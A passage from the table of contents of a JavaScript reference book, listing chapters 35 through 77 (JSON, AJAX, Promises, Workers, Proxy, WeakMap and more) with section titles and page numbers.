[237](#section-35.4-serializing-and-restoring-class-instances)](#section-35.4-serializing-and-restoring-class-instances)

[Section 35.5: Serializing with a replacer function
[238](#section-35.5-serializing-with-a-replacer-function)](#section-35.5-serializing-with-a-replacer-function)

[Section 35.6: Parsing a simple JSON string
[239](#section-35.6-parsing-a-simple-json-string)](#section-35.6-parsing-a-simple-json-string)

[Section 35.7: Cyclic object values
[239](#section-35.7-cyclic-object-values)](#section-35.7-cyclic-object-values)

[**Chapter 36: AJAX** [240](#chapter-36-ajax)](#chapter-36-ajax)

[Section 36.1: Sending and Receiving JSON Data via POST
[240](#section-36.1-sending-and-receiving-json-data-via-post)](#section-36.1-sending-and-receiving-json-data-via-post)

[Section 36.2: Add an AJAX preloader
[240](#section-36.2-add-an-ajax-preloader)](#section-36.2-add-an-ajax-preloader)

[Section 36.3: Displaying the top JavaScript questions of the month from
Stack Overflow&apos;s API
[241](#section-36.3-displaying-the-top-javascript-questions-of-the-month-from-stack-overflows-api)](#section-36.3-displaying-the-top-javascript-questions-of-the-month-from-stack-overflows-api)

[Section 36.4: Using GET with parameters
[242](#section-36.4-using-get-with-parameters)](#section-36.4-using-get-with-parameters)

[Section 36.5: Check if a file exists via a HEAD request
[243](#section-36.5-check-if-a-file-exists-via-a-head-request)](#section-36.5-check-if-a-file-exists-via-a-head-request)

[Section 36.6: Using GET and no parameters
[243](#section-36.6-using-get-and-no-parameters)](#section-36.6-using-get-and-no-parameters)

[Section 36.7: Listening to AJAX events at a global level
[243](#section-36.7-listening-to-ajax-events-at-a-global-level)](#section-36.7-listening-to-ajax-events-at-a-global-level)

[**Chapter 37: Enumerations**
[244](#chapter-37-enumerations)](#chapter-37-enumerations)

[Section 37.1: Enum definition using Object.freeze()
[244](#section-37.1-enum-definition-using-object.freeze)](#section-37.1-enum-definition-using-object.freeze)

[Section 37.2: Alternate definition
[244](#section-37.2-alternate-definition)](#section-37.2-alternate-definition)

[Section 37.3: Printing an enum variable
[244](#section-37.3-printing-an-enum-variable)](#section-37.3-printing-an-enum-variable)

[Section 37.4: Implementing Enums Using Symbols
[245](#section-37.4-implementing-enums-using-symbols)](#section-37.4-implementing-enums-using-symbols)

[Section 37.5: Automatic Enumeration Value
[245](#section-37.5-automatic-enumeration-value)](#section-37.5-automatic-enumeration-value)

[**Chapter 38: Map** [247](#chapter-38-map)](#chapter-38-map)

[Section 38.1: Creating a Map
[247](#section-38.1-creating-a-map)](#section-38.1-creating-a-map)

[Section 38.2: Clearing a Map
[247](#section-38.2-clearing-a-map)](#section-38.2-clearing-a-map)

[Section 38.3: Removing an element from a Map
[247](#section-38.3-removing-an-element-from-a-map)](#section-38.3-removing-an-element-from-a-map)

[Section 38.4: Checking if a key exists in a Map
[248](#section-38.4-checking-if-a-key-exists-in-a-map)](#section-38.4-checking-if-a-key-exists-in-a-map)

[Section 38.5: Iterating Maps
[248](#section-38.5-iterating-maps)](#section-38.5-iterating-maps)

[Section 38.6: Getting and setting elements
[248](#section-38.6-getting-and-setting-elements)](#section-38.6-getting-and-setting-elements)

[Section 38.7: Getting the number of elements of a Map
[249](#section-38.7-getting-the-number-of-elements-of-a-map)](#section-38.7-getting-the-number-of-elements-of-a-map)

[**Chapter 39: Timestamps**
[250](#chapter-39-timestamps)](#chapter-39-timestamps)

[Section 39.1: High-resolution timestamps
[250](#section-39.1-high-resolution-timestamps)](#section-39.1-high-resolution-timestamps)

[Section 39.2: Get Timestamp in Seconds
[250](#section-39.2-get-timestamp-in-seconds)](#section-39.2-get-timestamp-in-seconds)

[Section 39.3: Low-resolution timestamps
[250](#section-39.3-low-resolution-timestamps)](#section-39.3-low-resolution-timestamps)

[Section 39.4: Support for legacy browsers
[250](#section-39.4-support-for-legacy-browsers)](#section-39.4-support-for-legacy-browsers)

[**Chapter 40: Unary Operators**
[251](#chapter-40-unary-operators)](#chapter-40-unary-operators)

[Section 40.1: Overview
[251](#section-40.1-overview)](#section-40.1-overview)

[Section 40.2: The typeof operator
[251](#section-40.2-the-typeof-operator)](#section-40.2-the-typeof-operator)

[Section 40.3: The delete operator
[252](#section-40.3-the-delete-operator)](#section-40.3-the-delete-operator)

[Section 40.4: The unary plus operator (+)
[253](#section-40.4-the-unary-plus-operator)](#section-40.4-the-unary-plus-operator)

[Section 40.5: The void operator
[254](#section-40.5-the-void-operator)](#section-40.5-the-void-operator)

[Section 40.6: The unary negation operator (-)
[255](#section-40.6-the-unary-negation-operator)](#section-40.6-the-unary-negation-operator)

[Section 40.7: The bitwise NOT operator (&bsol;~)
[255](#section-40.7-the-bitwise-not-operator)](#section-40.7-the-bitwise-not-operator)

[Section 40.8: The logical NOT operator (!)
[256](#section-40.8-the-logical-not-operator)](#section-40.8-the-logical-not-operator)

[**Chapter 41: Generators**
[258](#chapter-41-generators)](#chapter-41-generators)

[Section 41.1: Generator Functions
[258](#section-41.1-generator-functions)](#section-41.1-generator-functions)

[Section 41.2: Sending Values to Generator
[259](#section-41.2-sending-values-to-generator)](#section-41.2-sending-values-to-generator)

[Section 41.3: Delegating to other Generator
[259](#section-41.3-delegating-to-other-generator)](#section-41.3-delegating-to-other-generator)

[Section 41.4: Iteration
[259](#section-41.4-iteration)](#section-41.4-iteration)

[Section 41.5: Async flow with generators
[260](#section-41.5-async-flow-with-generators)](#section-41.5-async-flow-with-generators)

[Section 41.6: Iterator-Observer interface
[261](#section-41.6-iterator-observer-interface)](#section-41.6-iterator-observer-interface)

[**Chapter 42: Promises**
[263](#chapter-42-promises)](#chapter-42-promises)

[Section 42.1: Introduction
[263](#section-42.1-introduction)](#section-42.1-introduction)

[Section 42.2: Promise chaining
[264](#section-42.2-promise-chaining)](#section-42.2-promise-chaining)

[Section 42.3: Waiting for multiple concurrent promises
[265](#section-42.3-waiting-for-multiple-concurrent-promises)](#section-42.3-waiting-for-multiple-concurrent-promises)

[Section 42.4: Reduce an array to chained promises
[266](#section-42.4-reduce-an-array-to-chained-promises)](#section-42.4-reduce-an-array-to-chained-promises)

[Section 42.5: Waiting for the first of multiple concurrent promises
[267](#section-42.5-waiting-for-the-first-of-multiple-concurrent-promises)](#section-42.5-waiting-for-the-first-of-multiple-concurrent-promises)

[Section 42.6: &quot;Promisifying&quot; functions with callbacks
[268](#section-42.6-promisifying-functions-with-callbacks)](#section-42.6-promisifying-functions-with-callbacks)

[Section 42.7: Error Handling
[268](#section-42.7-error-handling)](#section-42.7-error-handling)

[Section 42.8: Reconciling synchronous and asynchronous operations
[272](#section-42.8-reconciling-synchronous-and-asynchronous-operations)](#section-42.8-reconciling-synchronous-and-asynchronous-operations)

[Section 42.9: Delay function call
[273](#section-42.9-delay-function-call)](#section-42.9-delay-function-call)

[Section 42.10: &quot;Promisifying&quot; values
[273](#section-42.10-promisifying-values)](#section-42.10-promisifying-values)

[Section 42.11: Using ES2017 async/await
[274](#section-42.11-using-es2017-asyncawait)](#section-42.11-using-es2017-asyncawait)

[Section 42.12: Performing cleanup with finally()
[274](#section-42.12-performing-cleanup-with-finally)](#section-42.12-performing-cleanup-with-finally)

[Section 42.13: forEach with promises
[275](#section-42.13-foreach-with-promises)](#section-42.13-foreach-with-promises)

[Section 42.14: Asynchronous API request
[275](#section-42.14-asynchronous-api-request)](#section-42.14-asynchronous-api-request)

[**Chapter 43: Set** [277](#chapter-43-set)](#chapter-43-set)

[Section 43.1: Creating a Set
[277](#section-43.1-creating-a-set)](#section-43.1-creating-a-set)

[Section 43.2: Adding a value to a Set
[277](#section-43.2-adding-a-value-to-a-set)](#section-43.2-adding-a-value-to-a-set)

[Section 43.3: Removing value from a set
[277](#section-43.3-removing-value-from-a-set)](#section-43.3-removing-value-from-a-set)

[Section 43.4: Checking if a value exist in a set
[278](#section-43.4-checking-if-a-value-exist-in-a-set)](#section-43.4-checking-if-a-value-exist-in-a-set)

[Section 43.5: Clearing a Set
[278](#section-43.5-clearing-a-set)](#section-43.5-clearing-a-set)

[Section 43.6: Getting set length
[278](#section-43.6-getting-set-length)](#section-43.6-getting-set-length)

[Section 43.7: Converting Sets to arrays
[278](#section-43.7-converting-sets-to-arrays)](#section-43.7-converting-sets-to-arrays)

[Section 43.8: Intersection and dierence in Sets
[279](#section-43.8-intersection-and-dierence-in-sets)](#section-43.8-intersection-and-dierence-in-sets)

[Section 43.9: Iterating Sets
[279](#section-43.9-iterating-sets)](#section-43.9-iterating-sets)

[**Chapter 44: Modals - Prompts**
[280](#chapter-44-modalsprompts)](#chapter-44-modalsprompts)

[Section 44.1: About User Prompts
[280](#section-44.1-about-user-prompts)](#section-44.1-about-user-prompts)

[Section 44.2: Persistent Prompt Modal
[280](#section-44.2-persistent-prompt-modal)](#section-44.2-persistent-prompt-modal)

[Section 44.3: Confirm to Delete element
[281](#section-44.3-confirm-to-delete-element)](#section-44.3-confirm-to-delete-element)

[Section 44.4: Usage of alert()
[281](#section-44.4-usage-of-alert)](#section-44.4-usage-of-alert)

[Section 44.5: Usage of prompt()
[282](#section-44.5-usage-of-prompt)](#section-44.5-usage-of-prompt)

[**Chapter 45: execCommand and contenteditable**
[283](#chapter-45-execcommand-and-contenteditable)](#chapter-45-execcommand-and-contenteditable)

[Section 45.1: Listening to Changes of contenteditable
[284](#section-45.1-listening-to-changes-of-contenteditable)](#section-45.1-listening-to-changes-of-contenteditable)

[Section 45.2: Getting started
[284](#section-45.2-getting-started)](#section-45.2-getting-started)

[Section 45.3: Copy to clipboard from textarea using
execCommand(&quot;copy&quot;)
[285](#section-45.3-copy-to-clipboard-from-textarea-using-execcommandcopy)](#section-45.3-copy-to-clipboard-from-textarea-using-execcommandcopy)

[Section 45.4: Formatting
[285](#section-45.4-formatting)](#section-45.4-formatting)

[**Chapter 46: History**
[287](#chapter-46-history)](#chapter-46-history)

[Section 46.1: history.pushState()
[287](#section-46.1-history.pushstate)](#section-46.1-history.pushstate)

[Section 46.2: history.replaceState()
[287](#section-46.2-history.replacestate)](#section-46.2-history.replacestate)

[Section 46.3: Load a specific URL from the history list
[287](#section-46.3-load-a-specific-url-from-the-history-list)](#section-46.3-load-a-specific-url-from-the-history-list)

[**Chapter 47: Navigator Object**
[289](#chapter-47-navigator-object)](#chapter-47-navigator-object)

[Section 47.1: Get some basic browser data and return it as a JSON
object
[289](#section-47.1-get-some-basic-browser-data-and-return-it-as-a-json-object)](#section-47.1-get-some-basic-browser-data-and-return-it-as-a-json-object)

[**Chapter 48: BOM (Browser Object Model)**
[290](#chapter-48-bom-browser-object-model)](#chapter-48-bom-browser-object-model)

[Section 48.1: Introduction
[290](#section-48.1-introduction)](#section-48.1-introduction)

[Section 48.2: Window Object Properties
[290](#section-48.2-window-object-properties)](#section-48.2-window-object-properties)

[Section 48.3: Window Object Methods
[291](#section-48.3-window-object-methods)](#section-48.3-window-object-methods)

[**Chapter 49: The Event Loop**
[292](#chapter-49-the-event-loop)](#chapter-49-the-event-loop)

[Section 49.1: The event loop in a web browser
[292](#section-49.1-the-event-loop-in-a-web-browser)](#section-49.1-the-event-loop-in-a-web-browser)

[Section 49.2: Asynchronous operations and the event loop
[293](#section-49.2-asynchronous-operations-and-the-event-loop)](#section-49.2-asynchronous-operations-and-the-event-loop)

[**Chapter 50: Strict mode**
[294](#chapter-50-strict-mode)](#chapter-50-strict-mode)

[Section 50.1: For entire scripts
[294](#section-50.1-for-entire-scripts)](#section-50.1-for-entire-scripts)

[Section 50.2: For functions
[294](#section-50.2-for-functions)](#section-50.2-for-functions)

[Section 50.3: Changes to properties
[294](#section-50.3-changes-to-properties)](#section-50.3-changes-to-properties)

[Section 50.4: Changes to global properties
[295](#section-50.4-changes-to-global-properties)](#section-50.4-changes-to-global-properties)

[Section 50.5: Duplicate Parameters
[296](#section-50.5-duplicate-parameters)](#section-50.5-duplicate-parameters)

[Section 50.6: Function scoping in strict mode
[296](#section-50.6-function-scoping-in-strict-mode)](#section-50.6-function-scoping-in-strict-mode)

[Section 50.7: Behaviour of a function&apos;s arguments list
[296](#section-50.7-behaviour-of-a-functions-arguments-list)](#section-50.7-behaviour-of-a-functions-arguments-list)

[Section 50.8: Non-Simple parameter lists
[297](#section-50.8-non-simple-parameter-lists)](#section-50.8-non-simple-parameter-lists)

[**Chapter 51: Custom Elements**
[299](#chapter-51-custom-elements)](#chapter-51-custom-elements)

[Section 51.1: Extending Native Elements
[299](#section-51.1-extending-native-elements)](#section-51.1-extending-native-elements)

[Section 51.2: Registering New Elements
[299](#section-51.2-registering-new-elements)](#section-51.2-registering-new-elements)

[**Chapter 52: Data Manipulation**
[300](#chapter-52-data-manipulation)](#chapter-52-data-manipulation)

[Section 52.1: Format numbers as money
[300](#section-52.1-format-numbers-as-money)](#section-52.1-format-numbers-as-money)

[Section 52.2: Extract extension from file name
[300](#section-52.2-extract-extension-from-file-name)](#section-52.2-extract-extension-from-file-name)

[Section 52.3: Set object property given its string name
[301](#section-52.3-set-object-property-given-its-string-name)](#section-52.3-set-object-property-given-its-string-name)

[**Chapter 53: Binary Data**
[302](#chapter-53-binary-data)](#chapter-53-binary-data)

[Section 53.1: Getting binary representation of an image file
[302](#section-53.1-getting-binary-representation-of-an-image-file)](#section-53.1-getting-binary-representation-of-an-image-file)

[Section 53.2: Converting between Blobs and ArrayBuers
[302](#section-53.2-converting-between-blobs-and-arraybuers)](#section-53.2-converting-between-blobs-and-arraybuers)

[Section 53.3: Manipulating ArrayBuers with DataViews
[303](#section-53.3-manipulating-arraybuers-with-dataviews)](#section-53.3-manipulating-arraybuers-with-dataviews)

[Section 53.4: Creating a TypedArray from a Base64 string
[303](#section-53.4-creating-a-typedarray-from-a-base64-string)](#section-53.4-creating-a-typedarray-from-a-base64-string)

[Section 53.5: Using TypedArrays
[304](#section-53.5-using-typedarrays)](#section-53.5-using-typedarrays)

[Section 53.6: Iterating through an arrayBuer
[304](#section-53.6-iterating-through-an-arraybuer)](#section-53.6-iterating-through-an-arraybuer)

[**Chapter 54: Template Literals**
[306](#chapter-54-template-literals)](#chapter-54-template-literals)

[Section 54.1: Basic interpolation and multiline strings
[306](#section-54.1-basic-interpolation-and-multiline-strings)](#section-54.1-basic-interpolation-and-multiline-strings)

[Section 54.2: Tagged strings
[306](#section-54.2-tagged-strings)](#section-54.2-tagged-strings)

[Section 54.3: Raw strings
[307](#section-54.3-raw-strings)](#section-54.3-raw-strings)

[Section 54.4: Templating HTML With Template Strings
[307](#section-54.4-templating-html-with-template-strings)](#section-54.4-templating-html-with-template-strings)

[Section 54.5: Introduction
[308](#section-54.5-introduction)](#section-54.5-introduction)

[**Chapter 55: Fetch** [309](#chapter-55-fetch)](#chapter-55-fetch)

[Section 55.1: Getting JSON data
[309](#section-55.1-getting-json-data)](#section-55.1-getting-json-data)

[Section 55.2: Set Request Headers
[309](#section-55.2-set-request-headers)](#section-55.2-set-request-headers)

[Section 55.3: POST Data
[309](#section-55.3-post-data)](#section-55.3-post-data)

[Section 55.4: Send cookies
[310](#section-55.4-send-cookies)](#section-55.4-send-cookies)

[Section 55.5: GlobalFetch
[310](#section-55.5-globalfetch)](#section-55.5-globalfetch)

[Section 55.6: Using Fetch to Display Questions from the Stack Overflow
API
[310](#section-55.6-using-fetch-to-display-questions-from-the-stack-overflow-api)](#section-55.6-using-fetch-to-display-questions-from-the-stack-overflow-api)

[**Chapter 56: Scope** [311](#chapter-56-scope)](#chapter-56-scope)

[Section 56.1: Closures
[311](#section-56.1-closures)](#section-56.1-closures)

[Section 56.2: Hoisting
[312](#section-56.2-hoisting)](#section-56.2-hoisting)

[Section 56.3: Dierence between var and let
[315](#section-56.3-dierence-between-var-and-let)](#section-56.3-dierence-between-var-and-let)

[Section 56.4: Apply and Call syntax and invocation
[317](#section-56.4-apply-and-call-syntax-and-invocation)](#section-56.4-apply-and-call-syntax-and-invocation)

[Section 56.5: Arrow function invocation
[318](#section-56.5-arrow-function-invocation)](#section-56.5-arrow-function-invocation)

[Section 56.6: Bound invocation
[319](#section-56.6-bound-invocation)](#section-56.6-bound-invocation)

[Section 56.7: Method invocation
[319](#section-56.7-method-invocation)](#section-56.7-method-invocation)

[Section 56.8: Anonymous invocation
[320](#section-56.8-anonymous-invocation)](#section-56.8-anonymous-invocation)

[Section 56.9: Constructor invocation
[320](#section-56.9-constructor-invocation)](#section-56.9-constructor-invocation)

[Section 56.10: Using let in loops instead of var (click handlers
example)
[320](#section-56.10-using-let-in-loops-instead-of-var-click-handlers-example)](#section-56.10-using-let-in-loops-instead-of-var-click-handlers-example)

[**Chapter 57: Modules**
[322](#chapter-57-modules)](#chapter-57-modules)

[Section 57.1: Defining a module
[322](#section-57.1-defining-a-module)](#section-57.1-defining-a-module)

[Section 57.2: Default exports
[322](#section-57.2-default-exports)](#section-57.2-default-exports)

[Section 57.3: Importing named members from another module
[323](#section-57.3-importing-named-members-from-another-module)](#section-57.3-importing-named-members-from-another-module)

[Section 57.4: Importing an entire module
[323](#section-57.4-importing-an-entire-module)](#section-57.4-importing-an-entire-module)

[Section 57.5: Importing named members with aliases
[324](#section-57.5-importing-named-members-with-aliases)](#section-57.5-importing-named-members-with-aliases)

[Section 57.6: Importing with side eects
[324](#section-57.6-importing-with-side-eects)](#section-57.6-importing-with-side-eects)

[Section 57.7: Exporting multiple named members
[324](#section-57.7-exporting-multiple-named-members)](#section-57.7-exporting-multiple-named-members)

[**Chapter 58: Screen** [325](#chapter-58-screen)](#chapter-58-screen)

[Section 58.1: Getting the screen resolution
[325](#section-58.1-getting-the-screen-resolution)](#section-58.1-getting-the-screen-resolution)

[Section 58.2: Getting the "available" area of the screen
[325](#section-58.2-getting-the-available-area-of-the-screen)](#section-58.2-getting-the-available-area-of-the-screen)

[Section 58.3: Page width and height
[325](#section-58.3-page-width-and-height)](#section-58.3-page-width-and-height)

[Section 58.4: Window innerWidth and innerHeight Properties
[325](#section-58.4-window-innerwidth-and-innerheight-properties)](#section-58.4-window-innerwidth-and-innerheight-properties)

[Section 58.5: Getting color information about the screen
[325](#section-58.5-getting-color-information-about-the-screen)](#section-58.5-getting-color-information-about-the-screen)

[**Chapter 59: Variable coercion/conversion**
[326](#chapter-59-variable-coercionconversion)](#chapter-59-variable-coercionconversion)

[Section 59.1: Double Negation (!!x)
[326](#section-59.1-double-negation-x)](#section-59.1-double-negation-x)

[Section 59.2: Implicit conversion
[326](#section-59.2-implicit-conversion)](#section-59.2-implicit-conversion)

[Section 59.3: Converting to boolean
[326](#section-59.3-converting-to-boolean)](#section-59.3-converting-to-boolean)

[Section 59.4: Converting a string to a number
[327](#section-59.4-converting-a-string-to-a-number)](#section-59.4-converting-a-string-to-a-number)

[Section 59.5: Converting a number to a string
[328](#section-59.5-converting-a-number-to-a-string)](#section-59.5-converting-a-number-to-a-string)

[Section 59.6: Primitive to Primitive conversion table
[328](#section-59.6-primitive-to-primitive-conversion-table)](#section-59.6-primitive-to-primitive-conversion-table)

[Section 59.7: Convert an array to a string
[328](#section-59.7-convert-an-array-to-a-string)](#section-59.7-convert-an-array-to-a-string)

[Section 59.8: Array to String using array methods
[329](#section-59.8-array-to-string-using-array-methods)](#section-59.8-array-to-string-using-array-methods)

[Section 59.9: Converting a number to a boolean
[329](#section-59.9-converting-a-number-to-a-boolean)](#section-59.9-converting-a-number-to-a-boolean)

[Section 59.10: Converting a string to a boolean
[329](#section-59.10-converting-a-string-to-a-boolean)](#section-59.10-converting-a-string-to-a-boolean)

[Section 59.11: Integer to Float
[329](#section-59.11-integer-to-float)](#section-59.11-integer-to-float)

[Section 59.12: Float to Integer
[330](#section-59.12-float-to-integer)](#section-59.12-float-to-integer)

[Section 59.13: Convert string to float
[330](#section-59.13-convert-string-to-float)](#section-59.13-convert-string-to-float)

[**Chapter 60: Destructuring assignment**
[331](#chapter-60-destructuring-assignment)](#chapter-60-destructuring-assignment)

[Section 60.1: Destructuring Objects
[331](#section-60.1-destructuring-objects)](#section-60.1-destructuring-objects)

[Section 60.2: Destructuring function arguments
[332](#section-60.2-destructuring-function-arguments)](#section-60.2-destructuring-function-arguments)

[Section 60.3: Nested Destructuring
[332](#section-60.3-nested-destructuring)](#section-60.3-nested-destructuring)

[Section 60.4: Destructuring Arrays
[333](#section-60.4-destructuring-arrays)](#section-60.4-destructuring-arrays)

[Section 60.5: Destructuring inside variables
[333](#section-60.5-destructuring-inside-variables)](#section-60.5-destructuring-inside-variables)

[Section 60.6: Default Value While Destructuring
[334](#section-60.6-default-value-while-destructuring)](#section-60.6-default-value-while-destructuring)

[Section 60.7: Renaming Variables While Destructuring
[334](#section-60.7-renaming-variables-while-destructuring)](#section-60.7-renaming-variables-while-destructuring)

[**Chapter 61: WebSockets**
[335](#chapter-61-websockets)](#chapter-61-websockets)

[Section 61.1: Working with string messages
[335](#section-61.1-working-with-string-messages)](#section-61.1-working-with-string-messages)

[Section 61.2: Establish a web socket connection
[335](#section-61.2-establish-a-web-socket-connection)](#section-61.2-establish-a-web-socket-connection)

[Section 61.3: Working with binary messages
[335](#section-61.3-working-with-binary-messages)](#section-61.3-working-with-binary-messages)

[Section 61.4: Making a secure web socket connection
[336](#section-61.4-making-a-secure-web-socket-connection)](#section-61.4-making-a-secure-web-socket-connection)

[**Chapter 62: Arrow Functions**
[337](#chapter-62-arrow-functions)](#chapter-62-arrow-functions)

[Section 62.1: Introduction
[337](#section-62.1-introduction)](#section-62.1-introduction)

[Section 62.2: Lexical Scoping & Binding (Value of &quot;this&quot;)
[337](#section-62.2-lexical-scoping-binding-value-of-this)](#section-62.2-lexical-scoping-binding-value-of-this)

[Section 62.3: Arguments Object
[338](#section-62.3-arguments-object)](#section-62.3-arguments-object)

[Section 62.4: Implicit Return
[338](#section-62.4-implicit-return)](#section-62.4-implicit-return)

[Section 62.5: Arrow functions as a constructor
[339](#section-62.5-arrow-functions-as-a-constructor)](#section-62.5-arrow-functions-as-a-constructor)

[Section 62.6: Explicit Return
[339](#section-62.6-explicit-return)](#section-62.6-explicit-return)

[**Chapter 63: Workers**
[340](#chapter-63-workers)](#chapter-63-workers)

[Section 63.1: Web Worker
[340](#section-63.1-web-worker)](#section-63.1-web-worker)

[Section 63.2: A simple service worker
[340](#section-63.2-a-simple-service-worker)](#section-63.2-a-simple-service-worker)

[Section 63.3: Register a service worker
[341](#section-63.3-register-a-service-worker)](#section-63.3-register-a-service-worker)

[Section 63.4: Communicating with a Web Worker
[341](#section-63.4-communicating-with-a-web-worker)](#section-63.4-communicating-with-a-web-worker)

[Section 63.5: Terminate a worker
[342](#section-63.5-terminate-a-worker)](#section-63.5-terminate-a-worker)

[Section 63.6: Populating your cache
[343](#section-63.6-populating-your-cache)](#section-63.6-populating-your-cache)

[Section 63.7: Dedicated Workers and Shared Workers
[343](#section-63.7-dedicated-workers-and-shared-workers)](#section-63.7-dedicated-workers-and-shared-workers)

[**Chapter 64: requestAnimationFrame**
[345](#chapter-64-requestanimationframe)](#chapter-64-requestanimationframe)

[Section 64.1: Use requestAnimationFrame to fade in element
[345](#section-64.1-use-requestanimationframe-to-fade-in-element)](#section-64.1-use-requestanimationframe-to-fade-in-element)

[Section 64.2: Keeping Compatibility
[346](#section-64.2-keeping-compatibility)](#section-64.2-keeping-compatibility)

[Section 64.3: Cancelling an Animation
[346](#section-64.3-cancelling-an-animation)](#section-64.3-cancelling-an-animation)

[**Chapter 65: Creational Design Patterns**
[348](#chapter-65-creational-design-patterns)](#chapter-65-creational-design-patterns)

[Section 65.1: Factory Functions
[348](#section-65.1-factory-functions)](#section-65.1-factory-functions)

[Section 65.2: Factory with Composition
[349](#section-65.2-factory-with-composition)](#section-65.2-factory-with-composition)

[Section 65.3: Module and Revealing Module Patterns
[350](#section-65.3-module-and-revealing-module-patterns)](#section-65.3-module-and-revealing-module-patterns)

[Section 65.4: Prototype Pattern
[352](#section-65.4-prototype-pattern)](#section-65.4-prototype-pattern)

[Section 65.5: Singleton Pattern
[353](#section-65.5-singleton-pattern)](#section-65.5-singleton-pattern)

[Section 65.6: Abstract Factory Pattern
[354](#section-65.6-abstract-factory-pattern)](#section-65.6-abstract-factory-pattern)

[**Chapter 66: Detecting browser**
[355](#chapter-66-detecting-browser)](#chapter-66-detecting-browser)

[Section 66.1: Feature Detection Method
[355](#section-66.1-feature-detection-method)](#section-66.1-feature-detection-method)

[Section 66.2: User Agent Detection
[355](#section-66.2-user-agent-detection)](#section-66.2-user-agent-detection)

[Section 66.3: Library Method
[356](#section-66.3-library-method)](#section-66.3-library-method)

[**Chapter 67: Symbols**
[357](#chapter-67-symbols)](#chapter-67-symbols)

[Section 67.1: Basics of symbol primitive type
[357](#section-67.1-basics-of-symbol-primitive-type)](#section-67.1-basics-of-symbol-primitive-type)

[Section 67.2: Using Symbol.for() to create global, shared symbols
[357](#section-67.2-using-symbol.for-to-create-global-shared-symbols)](#section-67.2-using-symbol.for-to-create-global-shared-symbols)

[Section 67.3: Converting a symbol into a string
[357](#section-67.3-converting-a-symbol-into-a-string)](#section-67.3-converting-a-symbol-into-a-string)

[**Chapter 68: Transpiling**
[359](#chapter-68-transpiling)](#chapter-68-transpiling)

[Section 68.1: Introduction to Transpiling
[359](#section-68.1-introduction-to-transpiling)](#section-68.1-introduction-to-transpiling)

[Section 68.2: Start using ES6/7 with Babel
[360](#section-68.2-start-using-es67-with-babel)](#section-68.2-start-using-es67-with-babel)

[**Chapter 69: Automatic Semicolon Insertion - ASI**
[361](#chapter-69-automatic-semicolon-insertionasi)](#chapter-69-automatic-semicolon-insertionasi)

[Section 69.1: Avoid semicolon insertion on return statements
[361](#section-69.1-avoid-semicolon-insertion-on-return-statements)](#section-69.1-avoid-semicolon-insertion-on-return-statements)

[Section 69.2: Rules of Automatic Semicolon Insertion
[361](#section-69.2-rules-of-automatic-semicolon-insertion)](#section-69.2-rules-of-automatic-semicolon-insertion)

[Section 69.3: Statements aected by automatic semicolon insertion
[362](#section-69.3-statements-aected-by-automatic-semicolon-insertion)](#section-69.3-statements-aected-by-automatic-semicolon-insertion)

[**Chapter 70: Localization**
[364](#chapter-70-localization)](#chapter-70-localization)

[Section 70.1: Number formatting
[364](#section-70.1-number-formatting)](#section-70.1-number-formatting)

[Section 70.2: Currency formatting
[364](#section-70.2-currency-formatting)](#section-70.2-currency-formatting)

[Section 70.3: Date and time formatting
[364](#section-70.3-date-and-time-formatting)](#section-70.3-date-and-time-formatting)

[**Chapter 71: Geolocation**
[365](#chapter-71-geolocation)](#chapter-71-geolocation)

[Section 71.1: Get updates when a user&apos;s location changes
[365](#section-71.1-get-updates-when-a-users-location-changes)](#section-71.1-get-updates-when-a-users-location-changes)

[Section 71.2: Get a user&apos;s latitude and longitude
[365](#section-71.2-get-a-users-latitude-and-longitude)](#section-71.2-get-a-users-latitude-and-longitude)

[Section 71.3: More descriptive error codes
[365](#section-71.3-more-descriptive-error-codes)](#section-71.3-more-descriptive-error-codes)

[**Chapter 72: IndexedDB**
[367](#chapter-72-indexeddb)](#chapter-72-indexeddb)

[Section 72.1: Opening a database
[367](#section-72.1-opening-a-database)](#section-72.1-opening-a-database)

[Section 72.2: Adding objects
[367](#section-72.2-adding-objects)](#section-72.2-adding-objects)

[Section 72.3: Retrieving data
[368](#section-72.3-retrieving-data)](#section-72.3-retrieving-data)

[Section 72.4: Testing for IndexedDB availability
[369](#section-72.4-testing-for-indexeddb-availability)](#section-72.4-testing-for-indexeddb-availability)

[**Chapter 73: Modularization Techniques**
[370](#chapter-73-modularization-techniques)](#chapter-73-modularization-techniques)

[Section 73.1: ES6 Modules
[370](#section-73.1-es6-modules)](#section-73.1-es6-modules)

[Section 73.2: Universal Module Definition (UMD)
[370](#section-73.2-universal-module-definition-umd)](#section-73.2-universal-module-definition-umd)

[Section 73.3: Immediately invoked function expressions (IIFE)
[371](#section-73.3-immediately-invoked-function-expressions-iife)](#section-73.3-immediately-invoked-function-expressions-iife)

[Section 73.4: Asynchronous Module Definition (AMD)
[371](#section-73.4-asynchronous-module-definition-amd)](#section-73.4-asynchronous-module-definition-amd)

[Section 73.5: CommonJS - Node.js
[372](#section-73.5-commonjsnode.js)](#section-73.5-commonjsnode.js)

[**Chapter 74: Proxy** [374](#chapter-74-proxy)](#chapter-74-proxy)

[Section 74.1: Proxying property lookup
[374](#section-74.1-proxying-property-lookup)](#section-74.1-proxying-property-lookup)

[Section 74.2: Very simple proxy (using the set trap)
[374](#section-74.2-very-simple-proxy-using-the-set-trap)](#section-74.2-very-simple-proxy-using-the-set-trap)

[**Chapter 75: .postMessage() and MessageEvent**
[376](#chapter-75-.postmessage-and-messageevent)](#chapter-75-.postmessage-and-messageevent)

[Section 75.1: Getting Started
[376](#section-75.1-getting-started)](#section-75.1-getting-started)

[**Chapter 76: WeakMap**
[379](#chapter-76-weakmap)](#chapter-76-weakmap)

[Section 76.1: Creating a WeakMap object
[379](#section-76.1-creating-a-weakmap-object)](#section-76.1-creating-a-weakmap-object)

[Section 76.2: Getting a value associated to the key
[379](#section-76.2-getting-a-value-associated-to-the-key)](#section-76.2-getting-a-value-associated-to-the-key)

[Section 76.3: Assigning a value to the key
[379](#section-76.3-assigning-a-value-to-the-key)](#section-76.3-assigning-a-value-to-the-key)

[Section 76.4: Checking if an element with the key exists
[379](#section-76.4-checking-if-an-element-with-the-key-exists)](#section-76.4-checking-if-an-element-with-the-key-exists)

[Section 76.5: Removing an element with the key
[380](#section-76.5-removing-an-element-with-the-key)](#section-76.5-removing-an-element-with-the-key)

[Section 76.6: Weak reference demo
[380](#section-76.6-weak-reference-demo)](#section-76.6-weak-reference-demo)

[**Chapter 77: WeakSet**
[382](#chapter-77-weakset)](#chapter-77-weakset)

[Section 77.1: Creating a WeakSet object
[382](#section-77.1-creating-a-weakset-object)](#section-77.1-creating-a-weakset-object)

[Section 77.2: Adding a value
[382](#section-77.2-adding-a-value)](#section-77.2-adding-a-value)

